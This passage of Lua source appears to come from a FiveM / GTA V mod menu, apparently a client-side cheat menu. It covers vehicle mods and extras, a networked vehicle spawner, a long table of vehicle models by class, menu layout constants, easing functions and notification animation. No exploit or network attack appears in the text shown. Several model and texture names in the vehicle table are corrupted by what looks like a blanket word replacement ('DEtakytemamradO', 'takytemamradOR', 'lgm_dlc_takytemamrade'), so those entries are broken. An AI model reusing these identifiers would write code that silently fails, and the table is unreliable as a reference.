		return "Funeral"
	elseif (index == 40) then
		return "Spooky Loop"
	elseif (index == 41) then
		return "Spooky"
	elseif (index == 42) then
		return "San Andreas Loop"
	elseif (index == 43) then
		return "San Andreas"
	elseif (index == 44) then
		return "Liberty City Loop"
	elseif (index == 45) then
		return "Liberty City"
	elseif (index == 46) then
		return "Festive 1 Loop"
	elseif (index == 47) then
		return "Festive 1"
	elseif (index == 48) then
		return "Festive 2 Loop"
	elseif (index == 49) then
		return "Festive 2"
	elseif (index == 50) then
		return "Festive 3 Loop"
	elseif (index == 51) then
		return "Festive 3"
	else
		return "Unknown Horn"
	end
end

function LSC.UpdateMods()
	currentMods = Cya.Hra.GetVehicleProperties(Cya.Player.Vehicle)
	--SetVehicleModKit(Cya.Player.Vehicle, 0)
end

function LSC:CheckValidVehicleExtras()
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}

	for i=0,50,1 do
		if(DoesExtraExist(playerVeh, i))then
			local realModName = "Extra #"..tostring(i)
			local text = "OFF"
			if(IsVehicleExtraTurnedOn(playerVeh, i))then
				text = "ON"
			end
			local realSpawnName = "extra "..tostring(i)
			table.insert(valid, {
				menuName=realModName,
				data ={
					["action"] = realSpawnName,
					["state"] = text
				}
			})
		end
	end

	return valid
end


function LSC:DoesVehicleHaveExtras(vehicle)
	for i = 1, 30 do
		if ( DoesExtraExist( vehicle, i ) ) then
			return true
		end
	end

	return false
end


function LSC:CheckValidVehicleMods(modID)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}
	local modCount = GetNumVehicleMods(playerVeh,modID)

	-- Handle Liveries if they don't exist in modCount
	if (modID == 48 and modCount == 0) then

		-- Local to prevent below code running.
		local modCount = GetVehicleLiveryCount(playerVeh)
		for i=1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetLiveryName(playerVeh, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modID, realIndex

			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
	end
	-- Handles all other mods
	for i = 1, modCount, 1 do
		local realIndex = i - 1
		local modName = GetModTextLabel(playerVeh, modID, realIndex)
		local realModName = GetLabelText(modName)
		local modid, realSpawnName = modCount, realIndex


		valid[i] = {
			menuName=realModName,
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		}
	end


	-- Insert Stock Option for modifications
	if(modCount > 0)then
		local realIndex = -1
		local modid, realSpawnName = modID, realIndex
		table.insert(valid, 1, {
			menuName="Stock",
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		})
	end

	return valid
end
---------------------
--  Vehicle Class  --
---------------------
local function SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
	local speed = 0
	local rpm = 0

	if Cya.Player.IsInVehicle then
		local oldVehicle = Cya.Player.Vehicle
		speed = GetEntitySpeedVector(oldVehicle, true).y
		rpm = GetVehicleCurrentRpm(oldVehicle)
	end

	if IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)

		while not HasModelLoaded(modelName) do
			Wait(0)
		end

		local pos = (spawnInside and GetEntityCoords(PlayerPedId()) or GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 4.0, 0.0))
		local heading = GetEntityHeading(PlayerPedId()) + (spawnInside and 0 or 90)

		if replaceCurrent then
			RemoveVehicle(Cya.Player.Vehicle)
		end

		local vehicle = CreateVehicle(GetHashKey(modelName), pos.x, pos.y, pos.z, heading, true, false)

		if spawnInside then
			SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			SetVehicleEngineOn(vehicle, true, true)
		end
		
		SetVehicleForwardSpeed(vehicle, speed)
		SetVehicleCurrentRpm(vehicle, rpm)
		
		SetEntityAsNoLongerNeeded(vehicle)

		SetModelAsNoLongerNeeded(modelName)
	end


end


local VehicleClass = {
	
	-- Auta
	compacts = {{"BLISTA"},{"BRIOSO", "sssa_dlc_stunt"},{"DILETTANTE", "sssa_default", "dilettan"},{"ISSI2", "sssa_default"},{"ISSI3", "sssa_dlc_assault"},{"ISSI4"},{"ISSI5"},{"ISSI6"},{"PANTO", "sssa_dlc_hipster"},{"PRAIRIE", "sssa_dlc_battle"},{"RHAPSODY", "sssa_dlc_hipster"}},
	sedans = {{"ASEA", "sssa_dlc_business"},{"ASEA2"},{"ASTEROPE", "sssa_dlc_business", "astrope"},{"COG55", "lgm_dlc_apartments"},{"COG552", "lgm_dlc_apartments", "cog55"},{"COGNOSCENTI", "lgm_dlc_apartments", "cognosc"},{"COGNOSCENTI2", "lgm_dlc_apartments", "cognosc"},{"EMPEROR"},{"EMPEROR2"},{"EMPEROR3"},{"FUGITIVE", "sssa_default"},{"GLENDALE", "sssa_dlc_hipster"},{"INGOT", "sssa_dlc_business"},{"INTRUDER", "sssa_dlc_business"},{"LIMO2"},{"PREMIER", "sssa_dlc_business"},{"PRIMO"},{"PRIMO2", "lsc_default"},{"REGINA"},{"ROMERO", "sssa_dlc_battle"},{"SCHAFTER2", "sssa_dlc_heist"},{"SCHAFTER5"},{"SCHAFTER6"},{"STAFFORD", "lgm_dlc_battle"},{"STANIER", "sssa_dlc_business"},{"STRATUM", "sssa_dlc_business"},{"STRETCH", "sssa_default"},{"SUPERD", "lgm_default"},{"SURGE", "sssa_dlc_heist"},{"TAILGATER"},{"WARRENER"},{"WASHINGTON", "sssa_dlc_business", "washingt"},},
	suvs = {{"BALLER"},{"BALLER2", "sssa_default"},{"BALLER3", "lgm_dlc_apartments"},{"BALLER4", "lgm_dlc_apartments"},{"BALLER5"},{"BALLER6"},{"BJXL", "sssa_dlc_battle"},{"CAVALCADE", "sssa_default", "cavcade"},{"CAVALCADE2", "sssa_dlc_business", "cavcade2"},{"CONTENDER", "sssa_dlc_mp_to_sp"},{"DUBSTA"},{"DUBSTA2"},{"FQ2", "sssa_dlc_battle"},{"GRANGER", "sssa_dlc_business"},{"GRESLEY", "sssa_dlc_heist"},{"HABANERO", "sssa_dlc_battle"},{"HUNTLEY", "lgm_dlc_business2"},{"LANDSTALKER", "sssa_dlc_heist"},{"MESA", "candc_default"},{"MESA2"},{"PATRIOT", "sssa_dlc_battle"},{"PATRIOT2", "sssa_dlc_battle"},{"RADI", "sssa_dlc_business"},{"ROCOTO", "sssa_default"},{"SEMINOLE", "sssa_dlc_heist"},{"SERRANO", "sssa_dlc_battle"},{"TOROS", "lgm_dlc_apartments"},{"XLS", "lgm_dlc_executive1"},{"XLS2"},},
	coupes = {{"COGCABRIO", "lgm_default", "cogcabri"},{"EXEMPLAR", "sssa_default"},{"F620", "sssa_dlc_business"},{"FELON", "sssa_default"},{"FELON2", "sssa_default"},{"JACKAL", "sssa_dlc_heist"},{"ORACLE", "sssa_default"},{"ORACLE2"},{"SENTINEL", "sssa_dlc_business"},{"SENTINEL2"},{"WINDSOR", "lgm_dlc_takytemamrade"},{"WINDSOR2", "lgm_dlc_executive1"},{"ZION", "sssa_default"},{"ZION2", "sssa_default"},},
	muscle = {{"BLADE", "sssa_dlc_heist"},{"BUCCANEER"},{"BUCCANEER2", "lsc_default"},{"CHINO", "lgm_dlc_takytemamrade"},{"CHINO2", "lsc_default"},{"CLIQUE", "lgm_dlc_arena"},{"COQUETTE3", "lgm_dlc_takytemamrade"},{"DEVIANT", "lgm_dlc_apartments"},{"DOMINATOR", "sssa_dlc_business", "dominato"},{"DOMINATOR2", "sssa_dlc_mp_to_sp"},{"DOMINATOR3", "sssa_dlc_assault"},{"DOMINATOR4"},{"DOMINATOR5"},{"DOMINATOR6"},{"DUKES", "candc_default"},{"DUKES2", "candc_default"},{"ELLIE", "sssa_dlc_assault"},{"FACTION"},{"FACTION2", "lsc_default"},{"FACTION3", "lsc_lowrider"},{"GAUNTLET", "sssa_default"},{"GAUNTLET2", "sssa_dlc_mp_to_sp"},{"HERMES", "sssa_dlc_xmas2017"},{"HOTKNIFE", "lgm_default"},{"HUSTLER", "lgm_dlc_xmas2017"},{"IMPALER", "sssa_dlc_vinewood"},{"IMPALER2"},{"IMPALER3"},{"IMPALER4"},{"IMPERATOR"},{"IMPERATOR2"},{"IMPERATOR3"},{"LURCHER", "sssa_dlc_halloween"},{"MOONBEAM"},{"MOONBEAM2", "lsc_default"},{"NIGHTSHADE", "lgm_dlc_apartments", "NITESHAD"},{"PHOENIX"},{"PICADOR"},{"RATLOADER"},{"RATLOADER2"},{"RUINER", "sssa_dlc_battle"},{"RUINER2", "candc_importexport"},{"RUINER3"},{"SABREGT"},{"SABREGT2", "lsc_lowrider2"},{"SLAMVAN", "sssa_dlc_christmas_2"},{"SLAMVAN2"},{"SLAMVAN3", "lsc_lowrider2"},{"SLAMVAN4"},{"SLAMVAN5"},{"SLAMVAN6"},{"STALION", "sssa_dlc_mp_to_sp"},{"STALION2", "sssa_dlc_mp_to_sp"},{"TAMPA", "sssa_dlc_christmas_3"},{"TAMPA3", "candc_gunrunning"},{"TULIP", "sssa_dlc_arena"},{"VAMOS", "sssa_dlc_arena"},{"VIGERO", "sssa_default"},{"VIRGO", "lgm_dlc_takytemamrade"},{"VIRGO2", "lsc_lowrider"},{"VIRGO3"},{"VOODOO", "lsc_default"},{"VOODOO2"},{"YOSEMITE", "sssa_dlc_xmas2017"},},
	sportsclassics = {{"ARDENT", "candc_gunrunning"},{"BTYPE"},{"BTYPE2", "sssa_dlc_halloween"},{"BTYPE3"},{"CASCO", "lgm_dlc_heist"},{"CHEBUREK", "sssa_dlc_assault"},{"CHEETAH2", "lgm_dlc_executive1"},{"COQUETTE2", "lgm_dlc_pilot"},{"DEtakytemamradO", "candc_xmas2017"},{"FAGALOA", "sssa_dlc_assault"},{"FELTZER3", "lgm_dlc_takytemamrade"},{"GT500", "lgm_dlc_xmas2017"},{"INFERNUS2", "lgm_dlc_specialraces"},{"JB700", "lgm_default"},{"JESTER3", "lgm_dlc_apartments"},{"MAMBA", "lgm_dlc_apartments"},{"MANANA"},{"MICHELLI", "sssa_dlc_assault"},{"MONROE", "lgm_default"},{"PEYOTE"},{"PIGALLE"},{"RAPIDGT3", "lgm_dlc_smuggler"},{"RETINUE", "sssa_dlc_mp_to_sp"},{"SAVESTRA", "lgm_dlc_xmas2017"},{"STINGER", "lgm_default"},{"STINGERGT", "lgm_default", "stingerg"},{"STROMBERG", "candc_xmas2017"},{"SWINGER", "lgm_dlc_battle"},{"TORERO", "lgm_dlc_executive1"},{"TORNADO"},{"TORNADO2"},{"TORNADO3"},{"TORNADO4"},{"TORNADO5", "lsc_lowrider2"},{"TORNADO6", "sssa_dlc_biker"},{"TURISMO2", "lgm_dlc_specialraces"},{"VISERIS", "lgm_dlc_xmas2017"},{"Z190", "lgm_dlc_xmas2017"},{"ZTYPE", "lgm_default"},},
	sports = {{"ALPHA", "lgm_dlc_business"},{"BANSHEE", "lgm_default"},{"BESTIAGTS", "lgm_dlc_executive1"},{"BLISTA2", "sssa_dlc_mp_to_sp"},{"BLISTA3", "sssa_dlc_arena"},{"BUFFALO"},{"BUFFALO2"},{"BUFFALO3", "sssa_dlc_mp_to_sp"},{"CARBONIZZARE", "lgm_default", "carboniz"},{"COMET2", "sssa_default"},{"COMET3", "lsc_dlc_import_export"},{"COMET4", "lgm_dlc_xmas2017"},{"COMET5", "lgm_dlc_xmas2017"},{"COQUETTE", "lgm_default"},{"ELEGY", "lsc_dlc_import_export"},{"ELEGY2", "lgm_default"},{"FELTZER2", "lgm_default"},{"FLASHGT", "lgm_dlc_apartments"},{"FUROREGT", "lgm_dlc_its_creator", "furore"},{"FUSILADE", "sssa_dlc_business"},{"FUTO", "sssa_dlc_battle"},{"GB200", "lgm_dlc_apartments"},{"HOTRING", "sssa_dlc_assault"},{"ITALIGTO", "lgm_dlc_apartments"},{"JESTER", "lgm_dlc_business"},{"JESTER2", "sssa_dlc_christmas_2"},{"KHAMELION", "lgm_default"},{"KURUMA", "sssa_dlc_heist"},{"KURUMA2", "sssa_dlc_heist"},{"LYNX", "lgm_dlc_stunt"},{"MASSACRO", "lgm_dlc_business2"},{"MASSACRO2", "sssa_dlc_christmas_2"},{"NEON", "lgm_dlc_xmas2017"},{"NINEF", "lgm_default"},{"NINEF2", "lgm_default"},{"OMNIS", "sssa_dlc_mp_to_sp"},{"PARIAH", "lgm_dlc_xmas2017"},{"PENUMBRA", "sssa_dlc_business"},{"RAIDEN", "lgm_dlc_xmas2017"},{"RAPIDGT", "lgm_default"},{"RAPIDGT2", "lgm_default"},{"RAPTOR", "lgm_dlc_biker"},{"REVOLTER", "lgm_dlc_xmas2017"},{"RUSTON", "lgm_dlc_specialraces"},{"SCHAFTER2"},{"SCHAFTER3", "lgm_dlc_apartments"},{"SCHAFTER4", "lgm_dlc_apartments"},{"SCHAFTER5"},{"SCHLAGEN", "lgm_dlc_apartments"},{"SCHWARZER", "sssa_default", "schwarze"},{"SENTINEL3", "sssa_dlc_xmas2017"},{"SEVEN70", "lgm_dlc_executive1"},{"SPECTER"},{"SPECTER2", "lsc_dlc_import_export"},{"SULTAN"},{"SURANO", "lgm_default"},{"TAMPA2"},{"TROPOS"},{"VERLIERER2", "lgm_dlc_apartments", "verlier"},{"ZR380"},{"ZR3802"},{"ZR3803"},},
	super = {{"ADDER", "lgm_default"},{"AUTARCH", "lgm_dlc_xmas2017"},{"BANSHEE2", "lgm_default"},{"BULLET", "lgm_default"},{"CHEETAH", "lgm_default"},{"CYCLONE", "lgm_dlc_smuggler"},{"DEVESTE", "lgm_dlc_apartments"},{"ENTITYXF", "lgm_default"},{"ENTITY2", "lgm_dlc_apartments"},{"FMJ", "lgm_dlc_executive1"},{"GP1", "lgm_dlc_specialraces"},{"INFERNUS", "lgm_default"},{"ITALIGTB"},{"ITALIGTB2", "lsc_dlc_import_export"},{"LE7B", "lgm_dlc_stunt"},{"NERO"},{"NERO2", "lsc_dlc_import_export"},{"OSIRIS", "lgm_dlc_takytemamrade"},{"PENETRATOR", "lgm_dlc_heist"},{"PFISTER811", "lgm_dlc_executive1"},{"PROTOTIPO", "lgm_dlc_executive1"},{"REAPER", "lgm_dlc_executive1"},{"SC1", "lgm_dlc_xmas2017"},{"SCRAMJET", "candc_battle"},{"SHEAVA", "lgm_dlc_stunt"},{"SULTANRS", "lsc_jan2016", "sultan2"},{"T20", "lgm_dlc_takytemamrade"},{"TAIPAN", "lgm_dlc_apartments"},{"TEMPESTA", "lgm_dlc_heist"},{"TEZERACT", "lgm_dlc_apartments"},{"TURISMOR", "lgm_dlc_business"},{"TYRANT", "lgm_dlc_apartments"},{"TYRUS", "lgm_dlc_stunt"},{"VACCA", "lgm_default"},{"VAGNER", "lgm_dlc_executive1"},{"VIGILANTE", "candc_smuggler"},{"VISIONE", "lgm_dlc_smuggler"},{"VOLTIC", "lgm_default", "voltic_tless"},{"VOLTIC2", "candc_importexport"},{"XA21", "lgm_dlc_executive1"},{"ZENTORNO", "lgm_dlc_business2"},},
	motorcycles = {{"AKUMA", "sssa_default"},{"AVARUS", "sssa_dlc_biker"},{"BAGGER", "sssa_dlc_biker"},{"BATI", "sssa_default"},{"BATI2", "sssa_default"},{"BF400", "sssa_dlc_mp_to_sp"},{"CARBONRS", "lgm_default", "carbon"},{"CHIMERA", "sssa_dlc_biker"},{"CLIFFHANGER", "sssa_dlc_mp_to_sp"},{"DAEMON"},{"DAEMON2", "sssa_dlc_biker"},{"DEFILER", "sssa_dlc_biker"},{"DEATHBIKE"},{"DEATHBIKE2"},{"DEATHBIKE3"},{"DIABLOUS"},{"DIABLOUS2", "lsc_dlc_import_export"},{"DOUBLE", "sssa_default"},{"ENDURO", "sssa_dlc_heist"},{"ESSKEY", "sssa_dlc_biker"},{"FAGGIO", "sssa_default"},{"FAGGIO2"},{"FAGGIO3", "sssa_dlc_biker"},{"FCR"},{"FCR2", "lsc_dlc_import_export"},{"GARGOYLE", "mba_vehicles"},{"HAKUCHOU", "sssa_dlc_its_creator"},{"HAKUCHOU2", "lgm_dlc_biker"},{"HEXER", "sssa_default"},{"INNOVATION", "sssa_dlc_heist"},{"LECTRO", "lgm_dlc_heist"},{"MANCHEZ", "sssa_dlc_biker"},{"NEMESIS", "sssa_dlc_heist"},{"NIGHTBLADE", "sssa_dlc_biker"},{"OPPRESSOR", "candc_gunrunning"},{"OPPRESSOR2", "candc_battle"},{"PCJ", "sssa_default"},{"RATBIKE", "sssa_dlc_biker"},{"RUFFIAN", "sssa_default"},{"SANCHEZ", "sssa_default"},{"SANCHEZ2", "sssa_default"},{"SANCTUS", "sssa_dlc_biker"},{"SHOTARO", "lgm_dlc_biker"},{"SOVEREIGN", "sssa_dlc_heist"},{"THRUST", "lgm_dlc_business2"},{"VADER", "sssa_default"},{"VINDICATOR", "lgm_dlc_takytemamrade"},{"VORTEX", "sssa_dlc_biker"},{"WOLFSBANE", "sssa_dlc_biker"},{"ZOMBIEA", "sssa_dlc_biker"},{"ZOMBIEB", "sssa_dlc_biker"},},
	offroad = {{"BFINJECTION", "sssa_default", "bfinject"},{"BIFTA", "sssa_default"},{"BLAZER", "sssa_default"},{"BLAZER2", "candc_casinoheist"},{"BLAZER3"},{"BLAZER4", "sssa_dlc_biker"},{"BLAZER5", "candc_importexport"},{"BODHI2", "sssa_default"},{"BRAWLER", "lgm_dlc_takytemamrade"},{"BRUISER"},{"BRUISER2"},{"BRUISER3"},{"BRUTUS"},{"BRUTUS2"},{"BRUTUS3"},{"CARACARA", "sssa_dlc_vinewood"},{"DLOADER"},{"DUBSTA3", "candc_default"},{"DUNE", "sssa_default"},{"DUNE2"},{"DUNE3", "candc_gunrunning"},{"DUNE4"},{"DUNE5", "candc_importexport"},{"FREECRAWLER", "lgm_dlc_battle"},{"INSURGENT", "candc_default"},{"INSURGENT2", "candc_default"},{"INSURGENT3"},{"KALAHARI", "sssa_default"},{"KAMACHO", "sssa_dlc_xmas2017"},{"MARSHALL", "candc_default"},{"MENACER", "candc_battle"},{"MESA3", "candc_default"},{"MONSTER", "candc_default"},{"MONSTER3"},{"MONSTER4"},{"MONSTER5"},{"NIGHTSHARK", "candc_gunrunning"},{"RANCHERXL", "sssa_dlc_business", "rancherx"},{"RANCHERXL2"},{"RCBANDITO", "sssa_dlc_arena"},{"REBEL", "sssa_default"},{"REBEL2"},{"RIATA", "sssa_dlc_xmas2017"},{"SANDKING", "sssa_default"},{"SANDKING2", "sssa_default", "sandkin2"},{"TECHNICAL", "candc_default"},{"TECHNICAL2", "candc_importexport"},{"TECHNICAL3"},{"TROPHYTRUCK"},{"TROPHYTRUCK2"},},
	industrial = {{"BULLDOZER"},{"CUTTER"},{"DUMP", "candc_default"},{"FLATBED"},{"GUARDIAN", "sssa_dlc_heist"},{"HANDLER"},{"MIXER"},{"MIXER2"},{"RUBBLE"},{"TIPTRUCK"},{"TIPTRUCK2"},},
	utility = {{"AIRTUG"},{"CADDY"},{"CADDY2"},{"CADDY3"},{"DOCKTUG"},{"FORKLIFT"},{"TRACTOR2"},{"TRACTOR3"},{"MOWER"},{"RIPLEY"},{"SADLER", "sssa_default"},{"SADLER2"},{"SCRAP"},{"TOWTRUCK"},{"TOWTRUCK2"},{"TRACTOR"},{"UTILLITRUCK"},{"UTILLITRUCK2"},{"UTILLITRUCK3"},{"ARMYTRAILER"},{"ARMYTRAILER2"},{"FREIGHTTRAILER"},{"ARMYTANKER"},{"TRAILERLARGE"},{"DOCKTRAILER"},{"TR3"},{"TR2"},{"TR4"},{"TRFLAT"},{"TRAILERS"},{"TRAILERS4"},{"TRAILERS2"},{"TRAILERS3"},{"TVTRAILER"},{"TRAILERLOGS"},{"TANKER"},{"TANKER2"},{"BALETRAILER"},{"GRAINTRAILER"},{"BOATTRAILER"},{"RAKETRAILER"},{"TRAILERSMALL"},},
	vans = {{"BISON", "sssa_default"},{"BISON2"},{"BISON3"},{"BOBCATXL", "sssa_dlc_business"},{"BOXVILLE", "candc_casinoheist"},{"BOXVILLE2"},{"BOXVILLE3"},{"BOXVILLE4", "candc_default"},{"BOXVILLE5", "candc_importexport"},{"BURRITO"},{"BURRITO2", "candc_casinoheist"},{"BURRITO3"},{"BURRITO4"},{"BURRITO5"},{"CAMPER"},{"GBURRITO"},{"GBURRITO2", "sssa_dlc_heist"},{"JOURNEY", "candc_default"},{"MINIVAN", "sssa_dlc_business"},{"MINIVAN2", "lsc_lowrider2"},{"PARADISE", "sssa_default"},{"PONY"},{"PONY2"},{"RUMPO", "sssa_dlc_heist"},{"RUMPO2"},{"RUMPO3", "sssa_dlc_executive_1"},{"SPEEDO"},{"SPEEDO2"},{"SPEEDO4"},{"SURFER"},{"SURFER2"},{"TACO"},{"YOUGA"},{"YOUGA2", "sssa_dlc_biker"},},
	cycles = {{"BMX", "pandm_default"},{"CRUISER", "pandm_default"},{"FIXTER"},{"SCORCHER", "pandm_default"},{"TRIBIKE", "pandm_default"},{"TRIBIKE2", "pandm_default"},{"TRIBIKE3", "pandm_default"},},
	boats = {{"DINGHY", "dock_default", "DINGHY3"},{"DINGHY2", "dock_default", "DINGHY3"},{"DINGHY3", "dock_default"},{"DINGHY4", "dock_default", "DINGHY3"},{"JETMAX", "dock_default"},{"MARQUIS", "dock_default"},{"PREDATOR"},{"SEASHARK", "dock_default"},{"SEASHARK2"},{"SEASHARK3"},{"SPEEDER", "dock_default"},{"SPEEDER2"},{"SQUALO", "dock_default"},{"SUBMERSIBLE"},{"SUBMERSIBLE2"},{"SUNTRAP", "dock_default"},{"TORO", "dock_default"},{"TORO2", "dock_default", "TORO"},{"TROPIC", "dock_default"},{"TROPIC2"},{"TUG", "dock_dlc_executive1"},},
	helicopters = {{"AKULA", "candc_xmas2017"},{"ANNIHILATOR"},{"BUZZARD", "candc_default"},{"BUZZARD2"},{"CARGOBOB", "candc_default"},{"CARGOBOB2", "candc_executive1"},{"CARGOBOB3"},{"CARGOBOB4"},{"FROGGER"},{"FROGGER2"},{"HAVOK", "elt_dlc_smuggler"},{"HUNTER", "candc_smuggler"},{"MAVERICK"},{"POLMAV"},{"SAVAGE", "candc_default"},{"SEASPARROW", "elt_dlc_assault", "sparrow"},{"SKYLIFT"},{"SUPERVOLITO"},{"SUPERVOLITO2"},{"SWIFT", "elt_dlc_pilot"},{"SWIFT2", "elt_dlc_takytemamrade"},{"VALKYRIE", "candc_default"},{"VALKYRIE2"},{"VOLATUS", "elt_dlc_executive1"},},
	planes = {{"ALPHAZ1", "elt_dlc_smuggler"},{"AVENGER"},{"AVENGER2"},{"BESRA", "elt_dlc_pilot"},{"BLIMP"},{"BLIMP2"},{"BLIMP3", "elt_dlc_battle"},{"BOMBUSHKA", "candc_smuggler"},{"CARGOPLANE"},{"CUBAN800"},{"DODO"},{"DUSTER"},{"HOWARD", "elt_dlc_smuggler"},{"HYDRA", "candc_default"},{"JET"},{"LAZER", "candc_smuggler"},{"takytemamradOR"},{"takytemamradOR2", "elt_dlc_takytemamrade"},{"MAMMATUS"},{"MICROLIGHT", "elt_dlc_smuggler"},{"MILJET", "elt_dlc_pilot"},{"MOGUL", "candc_smuggler"},{"MOLOTOK", "candc_smuggler"},{"NIMBUS", "elt_dlc_executive1"},{"NOKOTA", "candc_smuggler"},{"PYRO", "candc_smuggler"},{"ROGUE", "candc_smuggler"},{"SEABREEZE", "elt_dlc_smuggler"},{"SHAMAL"},{"STARLING", "candc_smuggler"},{"STRIKEFORCE", "candc_battle"},{"STUNT"},{"TITAN"},{"TULA", "candc_smuggler"},{"VELUM"},{"VELUM2"},{"VESTRA", "elt_dlc_business"},{"VOLATOL", "candc_xmas2017"},},
	service = {{"AIRBUS", "candc_default"},{"BRICKADE", "candc_executive1"},{"BUS", "candc_default"},{"COACH", "candc_default"},{"PBUS2", "sssa_dlc_battle"},{"RALLYTRUCK", "sssa_dlc_mp_to_sp"},{"RENTALBUS"},{"TAXI"},{"TOURBUS"},{"TRASH"},{"TRASH2"},{"WASTELANDER", "candc_importexport", "wastlndr"},{"AMBULANCE"},{"FBI"},{"FBI2"},{"FIRETRUK", "candc_casinoheist"},{"LGUARD", "candc_casinoheist"},{"PBUS", "candc_default"},{"POLICE"},{"POLICE2"},{"POLICE3"},{"POLICE4"},{"POLICEB"},{"POLICEOLD1"},{"POLICEOLD2"},{"POLICET"},{"POLMAV"},{"PRANGER"},{"PREDATOR"},{"RIOT"},{"RIOT2", "candc_xmas2017"},{"SHERIFF"},{"SHERIFF2"},{"APC", "candc_gunrunning"},{"BARRACKS", "candc_default"},{"BARRACKS2"},{"BARRACKS3"},{"BARRAGE", "candc_xmas2017"},{"CHERNOBOG", "candc_xmas2017"},{"CRUSADER", "candc_default"},{"HALFTRACK", "candc_gunrunning"},{"KHANJALI", "candc_xmas2017"},{"RHINO", "candc_default"},{"SCARAB"},{"SCARAB2"},{"SCARAB3"},{"THRUSTER", "candc_xmas2017"},{"TRAILERSMALL2"},},
	commercial = {{"BENSON"},{"BIFF"},{"CERBERUS"},{"CERBERUS2"},{"CERBERUS3"},{"HAULER"},{"HAULER2"},{"MULE", "candc_default"},{"MULE2"},{"MULE3", "candc_default"},{"MULE4", "candc_battle"},{"PACKER"},{"PHANTOM"},{"PHANTOM2", "candc_importexport"},{"PHANTOM3"},{"POUNDER"},{"POUNDER2", "candc_battle"},{"STOCKADE", "candc_casinoheist"},{"STOCKADE3"},{"TERBYTE"},{"CABLECAR"},{"FREIGHT"},{"FREIGHTCAR"},{"FREIGHTCONT1"},{"FREIGHTCONT2"},{"FREIGHTGRAIN"},{"METROTRAIN"},{"TANKERCAR"},},
}


---------------------
--  takytemamrad Sekce  --
---------------------

takytemamrad = {}

takytemamrad.debug = false

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 194}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local aspectRatio = GetAspectRatio(true)
local screenResolution = GetActiveScreenResolution()

local menuWidth = 0.20 -- old version was 0.23
local titleHeight = 0.08
local titleYOffset = 0.02
local titleScale = 1.0

local separatorHeight = 0.0025

local buttonHeight = 0.042
local buttonFont = 6
local buttonScale = 0.355
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.0065
local buttonSpriteXOffset = 0.011
local buttonSpriteScale = { x = 0.016, y = 0 }

local fontHeight = GetTextScaleHeight(buttonScale, buttonFont)

local sliderWidth = (menuWidth / 4)

local sliderHeight = 0.016

local knobWidth = 0.002
local knobHeight = 0.016

local sliderFontScale = 0.275
local sliderFontHeight = GetTextScaleHeight(sliderFontScale, buttonFont)


local toggleInnerWidth = 0.008
local toggleInnerHeight = 0.014
local toggleOuterWidth = 0.01125
local toggleOuterHeight = 0.020

-- Vehicle preview, PlayerInfo, etc
local previewWidth = 0.100

local frameWidth = 0.004

local footerHeight = 0.032

local t
local pow = function(num, pow) return num ^ pow end
local sin = math.sin
local cos = math.cos
local sqrt = math.sqrt
local abs = math.abs
local asin  = math.asin


------------------------------------------------------------------------
-- t = time == how much time has to pass for the tweening to complete --
-- b = begin == starting property value								  --
-- c = change == ending - beginning									  --
-- d = duration == running time. How much time has passed *right now* --
------------------------------------------------------------------------

local cout = function(text) return end

local function outCubic(t, b, c, d)
	t = t / d - 1
	return c * (pow(t, 3) + 1) + b
end

local function inCubic (t, b, c, d)
	t = t / d
	return c * pow(t, 3) + b
end

local function inOutCubic(t, b, c, d)
	t = t / d * 2
	if t < 1 then
		return c / 2 * t * t * t + b
	else
		t = t - 2
		return c / 2 * (t * t * t + 2) + b
	end
end
  
local function outInCubic(t, b, c, d)
	if t < d / 2 then
		return outCubic(t * 2, b, c / 2, d)
	else
		return inCubic((t * 2) - d, b + c / 2, c / 2, d)
	end
end

local notifyBody = {
	-- Text
	scale = 0.35,
	offsetLine = 0.019, -- text height: 0.019 | newline height: 0.005 or 0.006
	finalPadding = 0.025,
	-- Warp
	offsetX = 0.0525, -- 0.0525
	offsetY = 0.01, -- 0.01
	-- Draw below footer
	footerYOffset = 0,
	-- Sprite
	dict = 'commonmenu',
	sprite = 'header_gradient_script',
	font = 4,
	width = menuWidth + frameWidth, 
	height = 0.031625, -- magic 0.8305 -- 0.011625
	heading = 90.0,
	-- Betwenn != notifications
	gap = 0.006,
}

local notifyDefault = {
	text = "Someone forgot to change me!",
	type = 'info',
	timeout = 6000,
	transition = 750,
}

local function NotifyCountLines(v, text)
	BeginTextCommandLineCount("notification_buffer")
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	AddTextComponentSubstringPlayerName(text)
	local nbrLines = GetTextScreenLineCount(v.x - notifyBody.offsetX, v.y - notifyBody.height)
	return nbrLines
end

-- Thread content
local function MakeRoomThread(v, from, to, duration)
	local notif = v
	local beginVal = from
	local endVal = to
	local change = endVal - beginVal

	local timer = 0
	
	local function SetTimer()
		timer = GetGameTimer()
	end
	
	local function GetTimer()
		return GetGameTimer() - timer
	end

	local new_what
	SetTimer()
	local isMoving = true
	while isMoving do
		new_what = outCubic(GetTimer(), beginVal, change, duration)
		if notif.y < endVal then
			notif.y = new_what
		else
			notif.y = endVal
			isMoving = false
			break
		end
		Wait(5)
	end

	-- debugprint("make room done")
end

-- Animating the 'push' transition of NotifyPrioritize
local function NotifyMakeRoom(v, from, to, duration)
	CreateThread(function()
		return MakeRoomThread(v, from, to, duration)
	end)
end

-- Does nothing right now; not used
local function NotifyGetResolutionConfiguration()
	SetScriptGfxAlign(string.byte('L'), string.byte('B'))
	local minimapTopX, minimapTopY = GetScriptGfxPosition(-0.0045, 0.002 + (-0.188888))
	ResetScriptGfxAlign()
	
	local w, h = GetActiveScreenResolution()
	
	return { x = minimapTopX, y = minimapTopY }
end

-- Pushes previous notifications down. Showing the incoming notification on top
